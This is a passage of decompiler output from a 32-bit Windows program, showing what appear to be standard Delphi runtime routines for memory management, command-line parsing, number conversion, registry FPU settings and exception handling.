  v13 = &savedregs;
  v12 = &loc_4022F2;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  if ( byte_41E041 )
    EnterCriticalSection(&CriticalSection);
  v2 = (unsigned int *)(a1 - 4);
  v3 = *(_DWORD *)(a1 - 4);
  if ( (v3 & 2) == 0 )
  {
    dword_41E42C = 9;
    goto LABEL_29;
  }
  --dword_41E41C;
  dword_41E420 -= (v3 & 0x7FFFFFFC) - 4;
  if ( (v3 & 1) != 0 )
  {
    v4 = *(v2 - 1);
    if ( v4 < 12 || (v4 & 0x80000003) != 0 )
    {
      dword_41E42C = 10;
      goto LABEL_29;
    }
    v5 = (unsigned int *)((char *)v2 - v4);
    if ( v4 != *(unsigned int *)((char *)v2 - v4 + 8) )
    {
      dword_41E42C = 10;
      goto LABEL_29;
    }
    v3 += v4;
    v2 = (unsigned int *)((char *)v2 - v4);
    sub_401AA8(v5);
  }
  v6 = v3 & 0x7FFFFFFC;
  v7 = (unsigned int *)((char *)v2 + v6);
  v8 = (unsigned int *)((char *)v2 + v6);
  if ( (unsigned int *)((char *)v2 + v6) != (unsigned int *)dword_41E484 )
  {
    if ( (*v7 & 2) != 0 )
    {
      if ( (*v7 & 0x7FFFFFFCu) < 4 )
      {
        dword_41E42C = 11;
        goto LABEL_29;
      }
      *v7 |= 1u;
    }
    else
    {
      v9 = (unsigned int *)((char *)v2 + v6);
      if ( !v8[1] || !*v8 || (int)v8[2] < 12 )
      {
        dword_41E42C = 11;
        goto LABEL_29;
      }
      v6 += v8[2];
      sub_401AA8(v9);
    }
    sub_401CF8(v2, v6);
LABEL_29:
    v14 = dword_41E42C;
    __writefsdword(0, (unsigned int)ExceptionList);
    v13 = (int *)&loc_4022F9;
    if ( byte_41E041 )
      LeaveCriticalSection(&CriticalSection);
    return v14;
  }
  dword_41E484 -= v6;
  dword_41E480 += v6;
  if ( dword_41E480 > 15360 )
    sub_401D80();
  v14 = 0;
  sub_403038((unsigned int)ExceptionList, (int)v12, (int)v13);
  return v14;
}
// 41E041: using guessed type char byte_41E041;
// 41E41C: using guessed type int dword_41E41C;
// 41E420: using guessed type int dword_41E420;
// 41E428: using guessed type char byte_41E428;
// 41E42C: using guessed type int dword_41E42C;
// 41E480: using guessed type int dword_41E480;
// 41E484: using guessed type int dword_41E484;

//----- (00402304) --------------------------------------------------------
unsigned int __usercall sub_402304@<eax>(int a1@<eax>, int a2@<edx>)
{
  signed int v2; // esi
  unsigned int *v3; // ebp
  int v4; // edi
  _DWORD *v5; // eax
  _DWORD *v6; // ebx
  unsigned int result; // eax
  int v8; // [esp+0h] [ebp-18h]
  int v9; // [esp+0h] [ebp-18h]
  int v10; // [esp+0h] [ebp-18h]
  int v11; // [esp+4h] [ebp-14h]

  v2 = (a2 + 7) & 0xFFFFFFFC;
  if ( v2 < 12 )
    v2 = 12;
  v3 = (unsigned int *)(a1 - 4);
  v4 = *(_DWORD *)(a1 - 4) & 0x7FFFFFFC;
  v5 = (_DWORD *)(v4 + a1 - 4);
  v6 = v5;
  if ( v4 < v2 )
  {
    while ( 1 )
    {
      v11 = v2 - v4;
      if ( v6 == (_DWORD *)dword_41E484 )
      {
        if ( dword_41E480 >= v11 )
        {
          dword_41E480 -= v11;
          dword_41E484 += v11;
          if ( dword_41E480 < 12 )
          {
            dword_41E484 += dword_41E480;
            v2 += dword_41E480;
            dword_41E480 = 0;
          }
          dword_41E420 += v2 - v4;
          result = *v3 & 0x80000003;
          *v3 = result | v2;
          LOBYTE(result) = 1;
          return result;
        }
        sub_401D80();
        v6 = (unsigned int *)((char *)v3 + v4);
      }
      if ( (*(_BYTE *)v6 & 2) == 0 )
      {
        v9 = v6[2];
        if ( v9 >= v11 )
        {
          sub_401AA8(v6);
          v10 = v9 - v11;
          if ( v10 < 12 )
          {
            v2 += v10;
            *(unsigned int *)((char *)v3 + v2) &= ~1u;
          }
          else
          {
            sub_401CF8((unsigned int *)((char *)v3 + v2), v10);
          }
          goto LABEL_28;
        }
        v6 = (_DWORD *)((char *)v6 + v9);
        v11 -= v9;
      }
      if ( (int)*v6 >= 0 || !(unsigned __int8)sub_401E84((char *)v6 + (*v6 & 0x7FFFFFFC), v11) )
        return 0;
      v6 = (unsigned int *)((char *)v3 + v4);
    }
  }
  v8 = v4 - v2;
  if ( v5 == (_DWORD *)dword_41E484 )
  {
    dword_41E484 -= v8;
    dword_41E480 += v8;
    if ( dword_41E480 < 12 )
    {
      dword_41E484 += v8;
      dword_41E480 -= v8;
      v2 = v4;
    }
  }
  else
  {
    if ( (*(_BYTE *)v5 & 2) == 0 )
    {
      v8 += v5[2];
      sub_401AA8(v5);
    }
    if ( v8 < 12 )
    {
      v2 = v4;
    }
    else
    {
      *(unsigned int *)((char *)v3 + v2) = v8 | 2;
      sub_401B6C((int)v3 + v2 + 4);
    }
  }
LABEL_28:
  dword_41E420 += v2 - v4;
  result = *v3 & 0x80000003;
  *v3 = result | v2;
  LOBYTE(result) = 1;
  return result;
}
// 41E420: using guessed type int dword_41E420;
// 41E480: using guessed type int dword_41E480;
// 41E484: using guessed type int dword_41E484;

//----- (004024D4) --------------------------------------------------------
char *__usercall sub_4024D4@<eax>(char *a1@<eax>, int a2@<edx>)
{
  char *v4; // edi
  int v5; // eax
  unsigned int v7[2]; // [esp-Ch] [ebp-1Ch] BYREF
  int *v8; // [esp-4h] [ebp-14h]
  char *v9; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  if ( !byte_41E428 && !sub_401904() )
    return 0;
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_402585;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  if ( byte_41E041 )
    EnterCriticalSection(&CriticalSection);
  if ( (unsigned __int8)sub_402304((int)a1, a2) )
  {
    v9 = a1;
  }
  else
  {
    v4 = (char *)sub_401FD8(a2);
    v5 = (*((_DWORD *)a1 - 1) & 0x7FFFFFFC) - 4;
    if ( a2 < v5 )
      v5 = a2;
    if ( v4 )
    {
      sub_4026B0(a1, v4, v5);
      sub_402160((int)a1);
    }
    v9 = v4;
  }
  __writefsdword(0, v7[0]);
  v8 = (int *)&loc_40258C;
  if ( byte_41E041 )
    LeaveCriticalSection(&CriticalSection);
  return v9;
}
// 41E041: using guessed type char byte_41E041;
// 41E428: using guessed type char byte_41E428;

//----- (00402598) --------------------------------------------------------
#error "40259C: call analysis failed (funcsize=8)"

//----- (004025B0) --------------------------------------------------------
int __usercall sub_4025B0@<eax>(int result@<eax>)
{
  if ( result )
  {
    result = off_41C020();
    if ( result )
      sub_402618(2);
  }
  return result;
}
// 41C020: using guessed type int (*off_41C020)(void);

//----- (004025C8) --------------------------------------------------------
_DWORD *__usercall sub_4025C8@<eax>(_DWORD *result@<eax>, int a2@<edx>)
{
  _DWORD *v2; // [esp-4h] [ebp-4h]
  _DWORD *v3; // [esp-4h] [ebp-4h]

  if ( *result )
  {
    if ( a2 )
    {
      result = (_DWORD *)off_41C024(result);
      if ( result )
      {
        *v2 = result;
        return result;
      }
LABEL_8:
      sub_402618(1);
    }
    *result = 0;
    result = (_DWORD *)off_41C020();
    if ( result )
      sub_402618(2);
  }
  else if ( a2 )
  {
    result = (_DWORD *)off_41C01C(result);
    if ( !result )
      goto LABEL_8;
    *v3 = result;
  }
  return result;
}
// 4025E0: variable 'v2' is possibly undefined
// 402612: variable 'v3' is possibly undefined
// 41C01C: using guessed type int (__cdecl *off_41C01C)(_DWORD);
// 41C020: using guessed type int (*off_41C020)(void);
// 41C024: using guessed type int (__cdecl *off_41C024)(_DWORD);

//----- (00402618) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall __noreturn sub_402618(char a1@<al>)
{
  int v1; // eax
  bool v2; // sf
  int v3; // eax

  v1 = a1 & 0x7F;
  if ( dword_41E004 )
    v1 = ((int (*)(void))dword_41E004)();
  v3 = v1 - 1;
  v2 = v3 < 0;
  LOBYTE(v3) = byte_402641[v3];
  if ( v2 )
    v3 = *((_DWORD *)sub_4059F0() + 1);
  sub_4034BC(v3);
}
// 402626: positive sp value 4 has been found
// 41E004: using guessed type int dword_41E004;

//----- (0040265C) --------------------------------------------------------
void sub_40265C()
{
  if ( *((_DWORD *)sub_4059F0() + 1) )
    sub_402618(0);
}

//----- (0040267C) --------------------------------------------------------
_DWORD *__usercall sub_40267C@<eax>(int a1@<eax>)
{
  _DWORD *result; // eax

  result = sub_4059F0();
  result[1] = a1;
  return result;
}

//----- (00402698) --------------------------------------------------------
int sub_402698()
{
  _DWORD *v0; // eax
  int v1; // ecx

  v0 = sub_4059F0();
  v1 = v0[1];
  v0[1] = 0;
  return v1;
}

//----- (004026B0) --------------------------------------------------------
int __usercall sub_4026B0@<eax>(char *a1@<eax>, char *a2@<edx>, int a3@<ecx>)
{
  int result; // eax
  int v5; // ecx
  char *v6; // esi
  char *v7; // edi
  int v8; // ecx
  int v9; // ecx
  _BYTE *v10; // esi
  _BYTE *v11; // edi

  result = a3;
  if ( a2 > a1 )
  {
    v6 = &a1[a3 - 4];
    v7 = &a2[a3 - 4];
    v8 = a3 >> 2;
    if ( v8 >= 0 )
    {
      while ( v8 )
      {
        *(_DWORD *)v7 = *(_DWORD *)v6;
        v6 -= 4;
        v7 -= 4;
        --v8;
      }
      v9 = result & 3;
      v10 = v6 + 3;
      v11 = v7 + 3;
      while ( v9 )
      {
        *v11-- = *v10--;
        --v9;
      }
    }
  }
  else if ( a2 != a1 )
  {
    v5 = a3 >> 2;
    if ( v5 >= 0 )
      qmemcpy(a2, a1, 4 * v5 + (result & 3));
  }
  return result;
}

//----- (004026F0) --------------------------------------------------------
char *__usercall sub_4026F0@<eax>(char *a1@<eax>, char **a2@<edx>)
{
  char *i; // ebx
  int v4; // eax
  char v5; // dl
  char v6; // dl
  char v8[4104]; // [esp+0h] [ebp-1008h] BYREF

  *(_DWORD *)v8 = a1;
  for ( i = a1; ; i += 2 )
  {
    while ( *i && (unsigned __int8)*i <= 0x20u )
      ++i;
    if ( *i != 34 || i[1] != 34 )
      break;
  }
  v4 = 0;
  while ( 1 )
  {
    v6 = *i;
    if ( (unsigned __int8)*i <= 0x20u || v4 >= 4096 )
      break;
    if ( v6 == 34 )
    {
      ++i;
      while ( 1 )
      {
        v5 = *i;
        if ( !*i || v5 == 34 )
          break;
        v8[v4++] = v5;
        ++i;
      }
      if ( *i )
        ++i;
    }
    else
    {
      v8[v4++] = v6;
      ++i;
    }
  }
  sub_4035B0(a2, v8, v4);
  return i;
}
// 4026F0: using guessed type char var_1008[4104];

//----- (00402768) --------------------------------------------------------
char *__usercall sub_402768@<eax>(int a1@<eax>, char **a2@<edx>)
{
  int v3; // ebx
  int ModuleFileNameA; // eax
  char *result; // eax
  char *CommandLineA; // edi
  CHAR Filename[276]; // [esp+0h] [ebp-114h] BYREF

  v3 = a1;
  if ( a1 )
  {
    CommandLineA = GetCommandLineA();
    while ( 1 )
    {
      result = sub_4026F0(CommandLineA, a2);
      CommandLineA = result;
      if ( !v3 || !*a2 )
        break;
      --v3;
    }
  }
  else
  {
    ModuleFileNameA = GetModuleFileNameA(0, Filename, 0x105u);
    return (char *)sub_4035B0(a2, Filename, ModuleFileNameA);
  }
  return result;
}

//----- (004027C0) --------------------------------------------------------
int sub_4027C0()
{
  int v0; // eax
  int result; // eax
  struct _SYSTEMTIME SystemTime; // [esp+0h] [ebp-18h] BYREF

  GetSystemTime(&SystemTime);
  v0 = 60 * SystemTime.wHour;
  LOWORD(v0) = SystemTime.wMinute + v0;
  result = SystemTime.wMilliseconds + 1000 * (SystemTime.wSecond + 60 * v0);
  dword_41E03C = result;
  return result;
}
// 41E03C: using guessed type int dword_41E03C;

//----- (004027FC) --------------------------------------------------------
void __noreturn sub_4027FC()
{
  if ( dword_41E018 )
    dword_41E018();
  sub_4034BC(210);
}
// 4027FC: using guessed type void __noreturn sub_4027FC();
// 41E018: using guessed type int (*dword_41E018)(void);

//----- (00402818) --------------------------------------------------------
unsigned __int8 __usercall sub_402818@<al>(
        unsigned __int8 *a1@<eax>,
        unsigned __int8 *a2@<edx>,
        unsigned __int8 a3@<cl>)
{
  unsigned __int8 v4; // al
  unsigned int v6; // edx
  unsigned __int8 *v7; // esi
  bool v8; // cf
  unsigned __int8 result; // al
  unsigned int v10; // ecx
  bool v11; // cc
  char v12; // cl

  v4 = *a1;
  v6 = *a2;
  v7 = a2 + 1;
  v8 = __CFADD__((_BYTE)v6, v4);
  result = v6 + v4;
  if ( !v8 && result <= a3 )
    goto LABEL_3;
  result = a3;
  v11 = a3 <= *a1;
  v12 = a3 - *a1;
  if ( !v11 )
  {
    LOBYTE(v6) = v12;
LABEL_3:
    v10 = v6;
    LOBYTE(v6) = *a1;
    *a1 = result;
    qmemcpy(&a1[v6 + 1], v7, v10);
  }
  return result;
}

//----- (00402848) --------------------------------------------------------
int __usercall sub_402848@<eax>(char *a1@<eax>, _BYTE *a2@<edx>)
{
  unsigned int v3; // ecx
  int result; // eax

  v3 = ((unsigned int)(unsigned __int8)*a2 + 1) >> 2;
  result = (*a2 + 1) & 3;
  qmemcpy(a1, a2, 4 * v3);
  qmemcpy(&a1[4 * v3], &a2[4 * v3], result);
  return result;
}

//----- (00402864) --------------------------------------------------------
int __usercall sub_402864@<eax>(int result@<eax>, int a2@<edx>, unsigned int a3@<ecx>)
{
  unsigned int v3; // esi
  unsigned int v4; // esi

  v3 = a3 >> 2;
  if ( a3 >> 2 )
  {
    while ( *(_DWORD *)result == *(_DWORD *)a2 )
    {
      v4 = v3 - 1;
      if ( !v4 )
      {
        result += 4;
        a2 += 4;
        goto LABEL_8;
      }
      if ( *(_DWORD *)(result + 4) != *(_DWORD *)(a2 + 4) )
        return result;
      result += 8;
      a2 += 8;
      v3 = v4 - 1;
      if ( !v3 )
        goto LABEL_8;
    }
  }
  else
  {
LABEL_8:
    if ( (a3 & 3) != 0
      && *(_BYTE *)result == *(_BYTE *)a2
      && ((a3 & 3) == 1
       || *(_BYTE *)(result + 1) == *(_BYTE *)(a2 + 1)
       && ((a3 & 3) == 2 || *(_BYTE *)(result + 2) == *(_BYTE *)(a2 + 2))) )
    {
      return 0;
    }
  }
  return result;
}

//----- (004028D4) --------------------------------------------------------
__int16 __usercall sub_4028D4@<ax>(char *a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  int v4; // eax
  int v5; // ecx

  BYTE1(a3) = a3;
  v4 = a3 << 16;
  LOWORD(v4) = a3;
  v5 = a2 >> 2;
  if ( a2 >> 2 >= 0 )
  {
    memset32(a1, v4, v5);
    memset(&a1[4 * v5], v4, a2 & 3);
  }
  return v4;
}

//----- (004028F4) --------------------------------------------------------
int __usercall sub_4028F4@<eax>(unsigned int a1@<eax>)
{
  dword_41E03C = 134775813 * dword_41E03C + 1;
  return ((unsigned int)dword_41E03C * (unsigned __int64)a1) >> 32;
}
// 41E03C: using guessed type int dword_41E03C;

//----- (0040290C) --------------------------------------------------------
char __usercall sub_40290C@<al>(int a1@<eax>, int a2@<edx>, _BYTE *a3@<ecx>)
{
  unsigned int v4; // eax
  int v5; // ebx
  unsigned int v6; // et2
  _BYTE *v7; // edi
  int v8; // ecx
  bool v9; // cc
  unsigned int v10; // ecx
  char result; // al
  char v12[21]; // [esp+1h] [ebp-25h]
  int v13; // [esp+16h] [ebp-10h]

  v13 = a2;
  v4 = abs32(a1);
  v5 = 0;
  do
  {
    v6 = v4 % 0xA;
    v4 /= 0xAu;
    v12[++v5] = v6 + 48;
  }
  while ( v4 );
  if ( a1 < 0 )
    v12[++v5] = 45;
  *a3 = v5;
  v7 = a3 + 1;
  v8 = v13;
  if ( v13 > 255 )
    v8 = 255;
  v9 = v8 <= v5;
  v10 = v8 - v5;
  if ( !v9 )
  {
    *(v7 - 1) += v10;
    memset(v7, 32, v10);
    v7 += v10;
  }
  do
  {
    result = v12[v5];
    *v7++ = result;
    --v5;
  }
  while ( v5 );
  return result;
}

//----- (0040296C) --------------------------------------------------------
char __usercall sub_40296C@<al>(int a1@<eax>, _BYTE *a2@<edx>)
{
  return sub_40290C(a1, 0, a2);
}

//----- (00402978) --------------------------------------------------------
int __usercall sub_402978@<eax>(int result@<eax>, char **a2@<edx>)
{
  char *v2; // esi
  int v3; // ebx
  char v4; // bl
  char v5; // ch
  char *v6; // esi
  unsigned __int8 v7; // bl
  unsigned __int8 v8; // bl
  int v9; // [esp-4h] [ebp-10h]

  v2 = (char *)result;
  v9 = result;
  if ( !result )
  {
LABEL_22:
    ++v2;
    goto LABEL_25;
  }
  result = 0;
  v3 = 0;
  do
    v4 = *v2++;
  while ( v4 == 32 );
  v5 = 0;
  switch ( v4 )
  {
    case '-':
      v5 = 1;
      goto LABEL_27;
    case '+':
LABEL_27:
      v4 = *v2++;
      goto LABEL_14;
    case '$':
    case 'x':
    case 'X':
LABEL_28:
      v7 = *v2++;
      if ( v7 )
      {
        while ( 1 )
        {
          if ( v7 >= 0x61u )
            v7 -= 32;
          LOBYTE(v3) = v7 - 48;
          if ( (unsigned __int8)v3 > 9u )
          {
            v8 = v3 - 17;
            if ( v8 > 5u )
              goto LABEL_25;
            LOBYTE(v3) = v8 + 10;
          }
          if ( (unsigned int)result > 0xFFFFFFF )
            goto LABEL_25;
          result = v3 + 16 * result;
          v7 = *v2++;
          if ( !v7 )
            goto LABEL_20;
        }
      }
      goto LABEL_22;
  }
  if ( v4 != 48 )
  {
LABEL_14:
    if ( v4 )
    {
LABEL_15:
      while ( 1 )
      {
        LOBYTE(v3) = v4 - 48;
        if ( (unsigned __int8)v3 > 9u || (unsigned int)result > 0xCCCCCCC )
          break;
        result = v3 + 10 * result;
        v4 = *v2++;
        if ( !v4 )
          goto LABEL_18;
      }
    }
    goto LABEL_25;
  }
  v4 = *v2++;
  if ( v4 == 120 || v4 == 88 )
    goto LABEL_28;
  if ( v4 )
    goto LABEL_15;
LABEL_18:
  if ( v5 == 1 )
  {
    result = -result;
    if ( result < 1 || result == 0 || result < 0 )
      goto LABEL_20;
LABEL_25:
    v6 = &v2[-v9];
    goto LABEL_21;
  }
  if ( result < 0 )
    goto LABEL_25;
LABEL_20:
  v6 = 0;
LABEL_21:
  *a2 = v6;
  return result;
}

//----- (00402A44) --------------------------------------------------------
_BYTE *__usercall sub_402A44@<eax>(_BYTE *result@<eax>, char *a2@<edx>, char a3@<cl>)
{
  char v3; // ch

  do
  {
    v3 = *a2++;
    *result++ |= v3;
    --a3;
  }
  while ( a3 );
  return result;
}

//----- (00402A58) --------------------------------------------------------
int sub_402A58()
{
  int v0; // ebx
  int v1; // eax

  v0 = 0;
  if ( GetKeyboardType(0) == 7 )
  {
    v1 = GetKeyboardType(1) & 0xFF00;
    if ( v1 == 3328 || v1 == 1024 )
      LOBYTE(v0) = 1;
  }
  return v0;
}

//----- (00402A88) --------------------------------------------------------
__int16 sub_402A88()
{
  __int16 result; // ax
  unsigned int v1[2]; // [esp-Ch] [ebp-18h] BYREF
  int *v2; // [esp-4h] [ebp-10h]
  DWORD cbData; // [esp+0h] [ebp-Ch] BYREF
  BYTE Data[4]; // [esp+4h] [ebp-8h] BYREF
  HKEY phkResult; // [esp+8h] [ebp-4h] BYREF
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  *(_DWORD *)Data = (unsigned __int16)word_41C000;
  if ( !RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Borland\\Delphi\\RTL", 0, 1u, &phkResult) )
  {
    v2 = &savedregs;
    v1[1] = (unsigned int)&loc_402AF9;
    v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v1);
    cbData = 4;
    RegQueryValueExA(phkResult, "FPUMaskValue", 0, 0, Data, &cbData);
    __writefsdword(0, v1[0]);
    v2 = (int *)&loc_402B00;
    RegCloseKey(phkResult);
  }
  result = Data[0] & 0x3F | word_41C000 & 0xFFC0;
  word_41C000 = result;
  return result;
}
// 41C000: using guessed type __int16 word_41C000;

//----- (00402B4C) --------------------------------------------------------
void sub_402B4C()
{
  __asm { fninit }
}

//----- (00402B58) --------------------------------------------------------
int __usercall sub_402B58@<eax>(int a1@<eax>)
{
  return *(_DWORD *)a1;
}

//----- (00402B5C) --------------------------------------------------------
int __usercall sub_402B5C@<eax>(int result@<eax>, void *a2@<edx>)
{
  qmemcpy(a2, *(const void **)(result - 44), **(unsigned __int8 **)(result - 44) + 1);
  return result;
}

//----- (00402B70) --------------------------------------------------------
_DWORD *__usercall sub_402B70@<eax>(int a1@<eax>)
{
  _DWORD *v1; // eax

  v1 = (_DWORD *)sub_402598(*(_DWORD *)(a1 - 40));
  return sub_402BE8(a1, v1);
}

//----- (00402B84) --------------------------------------------------------
int __usercall sub_402B84@<eax>(int *a1@<eax>)
{
  int v1; // ebx
  int *v2; // esi
  int v3; // esi
  int v4; // edx

  v1 = (int)a1;
  v2 = a1;
  do
  {
    v3 = *v2;
    v4 = *(_DWORD *)(v3 - 64);
    v2 = *(int **)(v3 - 36);
    if ( v4 )
    {
      sub_403BBC((int)a1, v4);
      a1 = (int *)v1;
    }
  }
  while ( v2 );
  return sub_4025B0((int)a1);
}

//----- (00402BAC) --------------------------------------------------------
_DWORD *__usercall sub_402BAC@<eax>(_DWORD *result@<eax>, char a2@<dl>)
{
  if ( a2 )
    result = (_DWORD *)sub_402CDC((int)result, a2);
  if ( a2 )
    return sub_402D34(result);
  return result;
}
// 402BBA: variable 'a2' is possibly undefined

//----- (00402BCC) --------------------------------------------------------
_DWORD *__usercall sub_402BCC@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  _DWORD *result; // eax
  char v3; // dl

  result = sub_402D3C(a1, a2);
  if ( v3 > 0 )
    return (_DWORD *)sub_402D2C(result);
  return result;
}
// 402BD3: variable 'v3' is possibly undefined

//----- (00402BDC) --------------------------------------------------------
_DWORD *__usercall sub_402BDC@<eax>(_DWORD *result@<eax>)
{
  if ( result )
    return (_DWORD *)(*(int (**)(void))(*result - 4))();
  return result;
}

//----- (00402BE8) --------------------------------------------------------
_DWORD *__usercall sub_402BE8@<eax>(int a1@<eax>, _DWORD *a2@<edx>)
{
  int v2; // ebx
  _DWORD *result; // eax
  int *v4; // ebx
  int v5; // ecx
  _DWORD *v6; // ebx
  int v7; // esi
  unsigned int v8; // [esp-4h] [ebp-10h] BYREF
  int v9; // [esp+0h] [ebp-Ch] BYREF

  v2 = a1;
  *a2 = a1;
  v8 = *(_DWORD *)(a1 - 40);
  memset(a2 + 1, 0, 4 * ((v8 >> 2) - 1) + (v8 & 3));
  result = a2;
  while ( 1 )
  {
    if ( *(_DWORD *)(v2 - 72) )
      v8 = *(_DWORD *)(v2 - 72);
    v4 = *(int **)(v2 - 36);
    if ( !v4 )
      break;
    v2 = *v4;
  }
  if ( &v8 != (unsigned int *)&v9 )
  {
    v5 = *(_DWORD *)v8;
    v6 = (_DWORD *)(v8 + 4);
    do
    {
      v7 = v6[4];
      if ( v7 )
        *(_DWORD *)((char *)a2 + v6[5]) = v7;
      v6 += 7;
      --v5;
    }
    while ( v5 );
  }
  return result;
}

//----- (00402C40) --------------------------------------------------------
char __usercall sub_402C40@<al>(int *a1@<eax>, int a2@<edx>)
{
  int v2; // eax

  if ( a1 )
  {
    while ( 1 )
    {
      v2 = *a1;
      if ( v2 == a2 )
        break;
      a1 = *(int **)(v2 - 36);
      if ( !a1 )
        return (char)a1;
    }
    LOBYTE(a1) = 1;
  }
  return (char)a1;
}

//----- (00402C58) --------------------------------------------------------
int __usercall sub_402C58@<eax>(int a1@<eax>, int a2@<ebx>)
{
  int result; // eax
  int i; // ebx
  unsigned __int16 *v5; // edi
  int v6; // ecx
  bool v7; // zf
  _WORD *v8; // edi
  int *v9; // ebx
  int v10; // [esp-4h] [ebp-8h]

  result = a2;
  for ( i = a1; ; i = *v9 )
  {
    v5 = *(unsigned __int16 **)(i - 48);
    if ( v5 )
    {
      v6 = *v5;
      v10 = v6;
      v7 = v5 + 1 == 0;
      v8 = v5 + 1;
      do
      {
        if ( !v6 )
          break;
        v7 = *v8++ == (unsigned __int16)result;
        --v6;
      }
      while ( !v7 );
      if ( v7 )
        break;
    }
    v9 = *(int **)(i - 36);
    if ( !v9 )
      return result;
  }
  return 2 * v10 - v6;
}

//----- (00402C88) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_402C88(int *a1@<eax>, int a2@<ebx>)
{
  char v2; // zf

  sub_402C58(*a1, a2);
  if ( !v2 )
    __asm { jmp     ebx }
  sub_4027FC();
}
// 402C98: positive sp value 4 has been found
// 402C93: variable 'v2' is possibly undefined
// 4027FC: using guessed type void __noreturn sub_4027FC();

//----- (00402CA0) --------------------------------------------------------
int sub_402CA0()
{
  return -2147418113;
}

//----- (00402CB4) --------------------------------------------------------
int __usercall sub_402CB4@<eax>(int *a1@<eax>, _WORD *a2@<edx>, int (*a3)(void)@<ebx>)
{
  char v3; // zf
  int *v5; // [esp-4h] [ebp-8h]

  LOWORD(a3) = *a2;
  if ( !*a2 )
    return (*(int (**)(void))(*a1 - 16))();
  if ( (unsigned __int16)a3 >= 0xC000u )
    return (*(int (**)(void))(*a1 - 16))();
  v5 = a1;
  sub_402C58(*a1, (int)a3);
  a1 = v5;
  if ( v3 )
    return (*(int (**)(void))(*a1 - 16))();
  else
    return a3();
}
// 402CCD: variable 'v3' is possibly undefined

//----- (00402CDC) --------------------------------------------------------
int __usercall sub_402CDC@<eax>(int result@<eax>, char a2@<dl>, ...)
{
  va_list va; // [esp+4h] [ebp+4h] BYREF

  va_start(va, a2);
  if ( a2 >= 0 )
    result = (*(int (**)(void))(result - 12))();
  __writefsdword(0, (unsigned int)va);
  return result;
}

//----- (00402D2C) --------------------------------------------------------
int __usercall sub_402D2C@<eax>(_DWORD *a1@<eax>)
{
  return (*(int (**)(void))(*a1 - 8))();
}

//----- (00402D34) --------------------------------------------------------
_DWORD *__usercall sub_402D34@<eax>(_DWORD *a1@<eax>)
{
  (*(void (**)(void))(*a1 - 28))();
  return a1;
}

//----- (00402D3C) --------------------------------------------------------
_DWORD *__usercall sub_402D3C@<eax>(_DWORD *result@<eax>, char a2@<dl>)
{
  _DWORD *v2; // [esp-4h] [ebp-4h]

  if ( a2 > 0 )
  {
    v2 = result;
    (*(void (**)(void))(*result - 24))();
    return v2;
  }
  return result;
}

//----- (00402D4C) --------------------------------------------------------
void sub_402D4C()
{
  if ( (unsigned __int8)byte_41C008 > 1u )
    RaiseException(0xEEDFADFu, 0, 0, 0);
}
// 41C008: using guessed type char byte_41C008;

//----- (00402D68) --------------------------------------------------------
void __usercall sub_402D68(ULONG_PTR a1@<eax>, ULONG_PTR a2@<edx>)
{
  ULONG_PTR v2[3]; // [esp-Ch] [ebp-Ch] BYREF

  if ( byte_41C008 )
  {
    v2[2] = a1;
    v2[1] = a1;
    v2[0] = a2;
    RaiseException(0xEEDFAE4u, 0, 2u, v2);
  }
}
// 41C008: using guessed type char byte_41C008;

//----- (00402D9C) --------------------------------------------------------
void __usercall sub_402D9C(ULONG_PTR a1@<ebx>, ULONG_PTR a2@<eax>)
{
  ULONG_PTR v2[2]; // [esp-8h] [ebp-8h] BYREF

  if ( (unsigned __int8)byte_41C008 > 1u )
  {
    v2[1] = a2;
    v2[0] = a1;
    RaiseException(0xEEDFAE0u, 0, 1u, v2);
  }
}
// 41C008: using guessed type char byte_41C008;

//----- (00402DB0) --------------------------------------------------------
void sub_402DB0()
{
  ;
}

//----- (00402DD0) --------------------------------------------------------
void __usercall sub_402DD0(ULONG_PTR a1@<ecx>, ULONG_PTR a2@<edx>, ULONG_PTR a3@<eax>)
{
  ULONG_PTR v3; // ecx
  ULONG_PTR v4[4]; // [esp-10h] [ebp-10h] BYREF

  if ( (unsigned __int8)byte_41C008 > 1u )
  {
    v4[3] = a3;
    v4[2] = a2;
    v4[1] = a1;
    sub_402DB0();
    v4[0] = v3;
    RaiseException(0xEEDFAE1u, 0, 1u, v4);
  }
}
// 402DE1: variable 'v3' is possibly undefined
// 41C008: using guessed type char byte_41C008;

//----- (00402DF8) --------------------------------------------------------
void __fastcall sub_402DF8(int a1, ULONG_PTR a2)
{
  ULONG_PTR v2; // [esp-4h] [ebp-4h] BYREF

  if ( (unsigned __int8)byte_41C008 > 1u )
  {
    v2 = a2;
    RaiseException(0xEEDFAE2u, 0, 1u, &v2);
  }
}
// 41C008: using guessed type char byte_41C008;

//----- (00402E14) --------------------------------------------------------
void __usercall sub_402E14(ULONG_PTR a1@<eax>, ULONG_PTR a2@<edx>)
{
  ULONG_PTR v2[2]; // [esp-8h] [ebp-8h] BYREF

  v2[1] = a1;
  v2[0] = a2;
  if ( (unsigned __int8)byte_41C008 > 1u )
    RaiseException(0xEEDFAE3u, 0, 2u, v2);
}
// 41C008: using guessed type char byte_41C008;

//----- (00402E34) --------------------------------------------------------
int __usercall sub_402E34@<eax>(
        EXCEPTION_RECORD *a1@<ebx>,
        int a2@<ebp>,
        void *a3@<edi>,
        ULONG_PTR a4@<esi>,
        struct _EXCEPTION_POINTERS ExceptionInfo,
        int a6)
{
  PEXCEPTION_RECORD ExceptionRecord; // eax
  ULONG_PTR v7; // edx
  PVOID ExceptionAddress; // ecx
  ULONG_PTR v9; // eax
  bool v10; // zf
  PCONTEXT ContextRecord; // edi
  _DWORD *v12; // eax
  ULONG_PTR Dr0; // ebx
  _DWORD v15[6]; // [esp-24h] [ebp-24h] BYREF
  void *v16; // [esp-Ch] [ebp-Ch]
  ULONG_PTR v17; // [esp-8h] [ebp-8h]
  EXCEPTION_RECORD *v18; // [esp-4h] [ebp-4h]

